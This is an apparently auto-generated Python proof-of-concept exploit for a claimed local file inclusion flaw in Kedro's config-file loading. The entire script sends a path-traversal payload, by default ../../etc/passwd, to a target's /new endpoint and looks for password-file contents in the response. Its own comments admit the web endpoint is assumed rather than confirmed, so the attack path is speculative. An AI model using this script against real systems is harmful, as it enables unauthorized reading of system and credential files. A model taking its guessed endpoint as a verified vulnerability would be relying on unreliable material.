#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: lfi-001
# Sink: _fetch_validate_parse_config_from_file
# Auto-generated — run with: python3 lfi_supply_like__fetch_validate_parse_config_from_file.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in Kedro's `--config` flag.

Vulnerability: The `_fetch_validate_parse_config_from_file` function opens a file
at a user-supplied path without sanitization, allowing arbitrary file reads.

Usage:
    python3 kedro_lfi_poc.py --target http://victim:8080 --config ../../etc/passwd

Note: This PoC assumes the Kedro CLI is exposed via a web interface or similar.
If the CLI is run directly, the exploit is trivial (just run `kedro new --config ../../etc/passwd`).
"""

import argparse
import sys
import urllib.request
import urllib.error
import urllib.parse
import json

def exploit(target_url: str, config_path: str) -> None:
    """
    Attempt to read an arbitrary file via the Kedro --config LFI vulnerability.
    
    Args:
        target_url: Base URL of the Kedro service (e.g., http://localhost:8000)
        config_path: Path traversal payload (e.g., ../../etc/passwd)
    """
    # Construct the endpoint that accepts the --config flag
    # This assumes a typical Kedro web interface or API endpoint
    # Adjust the path as needed based on the actual deployment
    endpoint = f"{target_url.rstrip('/')}/new"
    
    # Prepare the payload
    params = {
        "config": config_path,
        "starter": "default",  # Required parameter
        "name": "test_project",  # Required parameter
        "tools": "none",
        "example": "no",
        "telemetry_consent": "no"
    }
    
    # Encode parameters for POST request
    data = urllib.parse.urlencode(params).encode('utf-8')
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Payload config path: {config_path}")
    print(f"[*] Sending request to {endpoint}...")
    
    try:
        req = urllib.request.Request(endpoint, data=data, method='POST')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        
        with urllib.request.urlopen(req, timeout=10) as response:
            body = response.read().decode('utf-8', errors='replace')
            
            # Check if the response contains file contents (success indicator)
            if "root:" in body or "daemon:" in body or "bin:" in body:
                print("[+] SUCCESS! File contents detected in response:")
                print(body[:2000])  # Print first 2000 chars
            else:
                print("[*] Request completed, but file contents not clearly visible.")
                print("[*] Response snippet:")
                print(body[:500])
                
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error: {e.code} - {e.reason}")
        if e.code == 500:
            print("[*] Server error may indicate successful file read but invalid YAML parsing.")
            print("[*] Check server logs for details.")
    except urllib.error.URLError as e:
        print(f"[-] Connection failed: {e.reason}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(
        description="Kedro LFI Proof-of-Concept Exploit",
        epilog="Example: python3 kedro_lfi_poc.py --target http://localhost:8000 --config ../../etc/passwd"
    )
    parser.add_argument(
        "--target",
        required=True,
        help="Target Kedro service URL (e.g., http://localhost:8000)"
    )
    parser.add_argument(
        "--config",
        default="../../etc/passwd",
        help="Path traversal payload (default: ../../etc/passwd)"
    )
    parser.add_argument(
        "--safe",
        action="store_true",
        help="Use a benign payload (read /etc/hostname instead of /etc/passwd)"
    )
    
    args = parser.parse_args()
    
    # Use a safe payload by default if --safe is specified
    if args.safe:
        payload = "../../etc/hostname"
        print("[*] Using safe payload: ../../etc/hostname")
    else:
        payload = args.config
    
    exploit(args.target, payload)

if __name__ == "__main__":
    print("=" * 60)
    print("Kedro LFI Proof-of-Concept Exploit")
    print("=" * 60)
    print()
    main()
